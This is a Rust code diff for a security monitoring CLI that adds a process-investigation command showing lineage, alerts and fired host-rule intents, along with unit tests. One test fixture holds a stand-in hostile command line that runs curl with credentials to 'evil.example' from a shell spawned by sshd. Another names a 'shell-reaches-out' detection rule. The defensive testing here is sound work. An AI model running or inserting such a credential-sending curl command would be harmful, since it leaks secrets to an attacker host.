@@ -3,11 +3,11 @@ use std::path::PathBuf;
 use anyhow::{Context, Result, bail};
 
 use crate::api_client::{
-    AlertResponse, ApiClient, ConnectionResponse, ConntrackEventFrame, IdsRuleResponse,
-    IpsRuleResponse, LearningScopeBody, LearningSelector, LearningSessionResponse,
-    NetpolReplayBody, NetpolReplayResponse, StartLearningBody, StreamOpenError,
-    SuricataKeywordCount, SuricataRefusalResponse, SuricataReportResponse, SuricataRulesetResponse,
-    TraceBody, TraceResponse,
+    AlertResponse, ApiClient, ConnectionResponse, ConntrackEventFrame, HostRuleEntry,
+    IdsRuleResponse, IpsRuleResponse, LearningScopeBody, LearningSelector, LearningSessionResponse,
+    NetpolReplayBody, NetpolReplayResponse, ProcessEntryResponse, StartLearningBody,
+    StreamOpenError, SuricataKeywordCount, SuricataRefusalResponse, SuricataReportResponse,
+    SuricataRulesetResponse, TraceBody, TraceResponse,
 };
 use crate::cli::OutputFormat;
 use crate::table::{Align, Table, cells};
@@ -3565,6 +3565,254 @@ pub async fn cmd_status_enhanced(client: &ApiClient, output: OutputFormat) -> Re
 
 // ── Investigate ─────────────────────────────────────────────────────
 
+/// One step of a process's lineage, oldest first, as the terminal prints it.
+#[derive(serde::Serialize, Debug, PartialEq, Eq)]
+pub struct LineageStep {
+    pub pid: u32,
+    /// The executable path, or the kernel's short name in brackets where the
+    /// table never read the path.
+    pub executable: String,
+    /// The command line as the agent kept it, redacted where it read argv.
+    /// Absent for an ancestor that exited, or that the table no longer holds
+    /// under the same start time.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub command_line: Option<String>,
+    pub exited: bool,
+}
+
+/// The host rules that fired on a process, each with the intents it names.
+#[derive(serde::Serialize, Debug, PartialEq, Eq)]
+pub struct IntentsFired {
+    pub rule: String,
+    pub alerts: usize,
+    /// Empty where the rule is no longer loaded, which says nothing about
+    /// what it matched at the time.
+    pub intents: Vec<String>,
+}
+
+/// The alerts whose workload block names this process.
+fn alerts_of_process(alerts: &[AlertResponse], pid: u32) -> Vec<&AlertResponse> {
+    alerts
+        .iter()
+        .filter(|a| a.workload.as_ref().is_some_and(|w| w.pid == pid))
+        .collect()
+}
+
+/// The host rules among `alerts`, in order of first appearance, joined to the
+/// intents the loaded rule of that name carries.
+fn intents_fired(alerts: &[&AlertResponse], rules: &[HostRuleEntry]) -> Vec<IntentsFired> {
+    let mut fired: Vec<IntentsFired> = Vec::new();
+    for alert in alerts.iter().filter(|a| a.component == "host_rule") {
+        if let Some(entry) = fired.iter_mut().find(|f| f.rule == alert.rule_id) {
+            entry.alerts += 1;
+            continue;
+        }
+        let intents = rules
+            .iter()
+            .find(|r| r.id == alert.rule_id)
+            .map(|r| r.intents.iter().map(|i| i.name.clone()).collect())
+            .unwrap_or_default();
+        fired.push(IntentsFired {
+            rule: alert.rule_id.clone(),
+            alerts: 1,
+            intents,
+        });
+    }
+    fired
+}
+
+/// Whether a live table entry is the ancestor that was named, rather than a
+/// later process given the same pid. Where either side carries no start
+/// time the pid alone has to do.
+fn same_process(entry: &ProcessEntryResponse, start_ns: Option<u64>) -> bool {
+    match (entry.start_ns, start_ns) {
+        (Some(a), Some(b)) => a == b,
+        _ => true,
+    }
+}
+
+/// The lineage of `process`, oldest ancestor first and the process last.
+/// `live` holds the table's current entry for each ancestor that answered.
+fn lineage(process: &ProcessEntryResponse, live: &[ProcessEntryResponse]) -> Vec<LineageStep> {
+    let mut steps: Vec<LineageStep> = process
+        .ancestry
+        .as_ref()
+        .map(|a| {
+            a.ancestors
+                .iter()
+                .rev()
+                .map(|ancestor| LineageStep {
+                    pid: ancestor.pid,
+                    executable: ancestor
+                        .identity
+                        .path
+                        .clone()
+                        .unwrap_or_else(|| format!("[{}]", ancestor.comm)),
+                    command_line: live
+                        .iter()
+                        .find(|e| e.pid == ancestor.pid && same_process(e, ancestor.start_ns))
+                        .and_then(|e| e.command_line.clone()),
+                    exited: ancestor.exited_at_ns.is_some(),
+                })
+                .collect()
+        })
+        .unwrap_or_default();
+    steps.push(LineageStep {
+        pid: process.pid,
+        executable: process.executable(),
+        command_line: process.command_line.clone(),
+        exited: false,
+    });
+    steps
+}
+
+/// `investigate --pid`: the process, the chain that started it with each
+/// command line as the agent redacted it, the alerts raised on it and the
+/// intents of the host rules that fired.
+pub async fn cmd_investigate_process(
+    client: &ApiClient,
+    pid: u32,
+    alert_limit: u64,
+    output: OutputFormat,
+) -> Result<()> {
+    let process = client
+        .get_process(pid)
+        .await
+        .with_context(|| format!("process {pid} is not in this agent's process table"))?;
+
+    let live_pids: Vec<u32> = process
+        .ancestry
+        .as_ref()
+        .map(|a| {
+            a.ancestors
+                .iter()
+                .filter(|x| x.exited_at_ns.is_none())
+                .map(|x| x.pid)
+                .collect()
+        })
+        .unwrap_or_default();
+    let mut live = Vec::with_capacity(live_pids.len());
+    for ancestor in live_pids {
+        if let Ok(entry) = client.get_process(ancestor).await {
+            live.push(entry);
+        }
+    }
+
+    let (alerts_res, rules_res) = tokio::join!(
+        client.list_alerts(
+            None,
+            None,
+            None,
+            None,
+            &crate::api_client::ANY_TRIAGE,
+            alert_limit,
+            0
+        ),
+        client.host_rules(),
+    );
+    let alerts = alerts_res.map(|r| r.alerts).unwrap_or_default();
+    let rules = rules_res.map(|r| r.rules).unwrap_or_default();
+    let raised = alerts_of_process(&alerts, pid);
+    let fired = intents_fired(&raised, &rules);
+    let steps = lineage(&process, &live);
+
+    if output == OutputFormat::Json {
+        let json = serde_json::json!({
+            "pid": pid,
+            "process": process,
+            "lineage": steps,
+            "alert_count": raised.len(),
+            "alerts": raised,
+            "intents_fired": fired,
+        });
+        println!("{}", serde_json::to_string_pretty(&json)?);
+        return Ok(());
+    }
+
+    print_process_investigation(&process, &steps, &raised, &fired);
+    Ok(())
+}
+
+/// The text form of `investigate --pid`.
+fn print_process_investigation(
+    process: &ProcessEntryResponse,
+    steps: &[LineageStep],
+    raised: &[&AlertResponse],
+    fired: &[IntentsFired],
+) {
+    let pid = process.pid;
+    println!();
+    println!(
+        "  Process {pid}  |  {}  |  uid {}",
+        process.executable(),
+        process.uid
+    );
+    if let Some(container) = &process.container {
+        println!(
+            "  Container: {} ({})",
+            container.name.as_deref().unwrap_or(&container.id),
+            container.runtime
+        );
+    }
+    println!();
+    print_lineage(steps, process.ancestry.as_ref());
+    println!();
+
+    println!("  Alerts raised on this process: {}", raised.len());
+    if !raised.is_empty() {
+        let mut table = Table::new(&[
+            ("COMPONENT", Align::Left),
+            ("SEVERITY", Align::Left),
+            ("RULE", Align::Left),
+            ("MESSAGE", Align::Left),
+        ])
+        .indent("  ");
+        for a in raised.iter().take(20) {
+            table.row(cells![
+                a.component,
+                a.severity,
+                a.rule_id,
+                truncate(&a.message, 60)
+            ]);
+        }
+        table.print();
+        if raised.len() > 20 {
+            println!("  ... and {} more", raised.len() - 20);
+        }
+    }
+    println!();
+
+    println!("  Host rules that fired: {}", fired.len());
+    for f in fired {
+        let intents = if f.intents.is_empty() {
+            "rule no longer loaded".to_string()
+        } else {
+            f.intents.join(", ")
+        };
+        println!("    {}  x{}  intents: {intents}", f.rule, f.alerts);
+    }
+    println!();
+}
+
+/// Print the lineage oldest first, each step indented under its parent.
+fn print_lineage(
+    steps: &[LineageStep],
+    ancestry: Option<&crate::api_client::ProcessAncestryResponse>,
+) {
+    println!("  Lineage (command lines as the agent redacted them):");
+    if ancestry.is_some_and(|a| a.incomplete || a.truncated) {
+        println!("    ...  earlier ancestors are not held");
+    }
+    for (depth, step) in steps.iter().enumerate() {
+        let pad = "  ".repeat(depth);
+        let exited = if step.exited { "  (exited)" } else { "" };
+        println!("    {pad}{:>7}  {}{exited}", step.pid, step.executable);
+        if let Some(line) = &step.command_line {
+            println!("    {pad}         {}", truncate(line, 100));
+        }
+    }
+}
+
 #[allow(clippy::too_many_lines)]
 pub async fn cmd_investigate(
     client: &ApiClient,
@@ -7113,6 +7361,116 @@ fn print_source_only(rules: &[crate::api_client::WorkloadReachEntry]) {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn process(value: serde_json::Value) -> ProcessEntryResponse {
+        serde_json::from_value(value).expect("a process entry")
+    }
+
+    fn alert(component: &str, rule: &str, pid: Option<u32>) -> AlertResponse {
+        let mut value = serde_json::json!({
+            "id": format!("{rule}-{pid:?}"), "timestamp_ns": 1, "component": component,
+            "severity": "high", "rule_id": rule, "action": "alert",
+            "src_addr": [0, 0, 0, 0], "dst_addr": [0, 0, 0, 0],
+            "src_port": 0, "dst_port": 0, "protocol": 0, "message": "m",
+        });
+        if let Some(pid) = pid {
+            value["workload"] = serde_json::json!({ "pid": pid, "source": "process" });
+        }
+        serde_json::from_value(value).expect("an alert")
+    }
+
+    fn rule(id: &str, intents: &[&str]) -> HostRuleEntry {
+        serde_json::from_value(serde_json::json!({
+            "id": id, "severity": "high", "then": [], "state": "loaded", "mode": "alert",
+            "spec": {},
+            "intents": intents.iter().map(|n| serde_json::json!({"name": n, "state": "served"}))
+                .collect::<Vec<_>>(),
+        }))
+        .expect("a host rule")
+    }
+
+    fn bash() -> ProcessEntryResponse {
+        process(serde_json::json!({
+            "pid": 300, "comm": "bash", "identity": {"kind": "path", "path": "/usr/bin/bash"},
+            "command_line": "bash -c curl -u ops:[redacted] https://evil.example",
+            "uid": 1000, "gid": 1000, "cgroup_id": 1, "started_at_ns": 9,
+            "ancestry": {"incomplete": false, "ancestors": [
+                {"pid": 200, "start_ns": 5, "comm": "sshd",
+                 "identity": {"kind": "path", "path": "/usr/sbin/sshd"}, "uid": 0},
+                {"pid": 150, "comm": "init", "identity": {"kind": "unknown"}, "uid": 0,
+                 "exited_at_ns": 7},
+            ]},
+        }))
+    }
+
+    #[test]
+    fn the_lineage_reads_oldest_first_and_ends_on_the_process() {
+        let sshd = process(serde_json::json!({
+            "pid": 200, "comm": "sshd", "identity": {"kind": "path", "path": "/usr/sbin/sshd"},
+            "command_line": "sshd: ops [priv]", "uid": 0, "gid": 0, "cgroup_id": 1,
+            "started_at_ns": 5, "start_ns": 5,
+        }));
+        let steps = lineage(&bash(), &[sshd]);
+
+        assert_eq!(
+            steps.iter().map(|s| s.pid).collect::<Vec<_>>(),
+            vec![150, 200, 300]
+        );
+        assert_eq!(steps[0].executable, "[init]");
+        assert!(steps[0].exited);
+        assert_eq!(steps[1].command_line.as_deref(), Some("sshd: ops [priv]"));
+        assert_eq!(
+            steps[2].command_line.as_deref(),
+            Some("bash -c curl -u ops:[redacted] https://evil.example")
+        );
+    }
+
+    #[test]
+    fn an_ancestor_whose_pid_was_reused_lends_no_command_line() {
+        let later = process(serde_json::json!({
+            "pid": 200, "comm": "cron", "identity": {"kind": "path", "path": "/usr/sbin/cron"},
+            "command_line": "cron -f", "uid": 0, "gid": 0, "cgroup_id": 1,
+            "started_at_ns": 50, "start_ns": 50,
+        }));
+        let steps = lineage(&bash(), &[later]);
+
+        assert_eq!(steps[1].executable, "/usr/sbin/sshd");
+        assert_eq!(steps[1].command_line, None);
+    }
+
+    #[test]
+    fn only_the_alerts_naming_the_process_are_kept_and_its_host_rules_name_their_intents() {
+        let alerts = vec![
+            alert("host_rule", "shell-reaches-out", Some(300)),
+            alert("host_rule", "shell-reaches-out", Some(300)),
+            alert("ids", "sid-1", Some(300)),
+            alert("host_rule", "shell-reaches-out", Some(301)),
+            alert("host_rule", "gone", Some(300)),
+            alert("firewall", "fw-1", None),
+        ];
+        let rules = vec![rule(
+            "shell-reaches-out",
+            &["process.starts", "process.connects"],
+        )];
+
+        let raised = alerts_of_process(&alerts, 300);
+        assert_eq!(raised.len(), 4);
+        assert_eq!(
+            intents_fired(&raised, &rules),
+            vec![
+                IntentsFired {
+                    rule: "shell-reaches-out".into(),
+                    alerts: 2,
+                    intents: vec!["process.starts".into(), "process.connects".into()],
+                },
+                IntentsFired {
+                    rule: "gone".into(),
+                    alerts: 1,
+                    intents: vec![],
+                },
+            ]
+        );
+    }
 
     #[test]
     fn a_round_trip_quantile_is_the_bound_of_the_bucket_crossing_it() {
